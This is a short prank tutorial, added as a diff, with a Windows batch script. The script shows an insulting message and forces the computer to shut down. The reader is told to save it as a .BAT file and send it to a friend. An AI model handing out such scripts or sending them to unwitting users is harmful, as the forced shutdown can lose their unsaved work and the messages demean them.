@@ -1,0 +1,10 @@
+Shut Down PC with I Love You Messege
+Convey your friend a little message and shut down his / her computer:
+
+@echo off
+
+msg * I don’t like you
+
+shutdown -c “Error! You are too stupid!” -s
+
+Save it as “Anything.BAT” in All Files and send it.
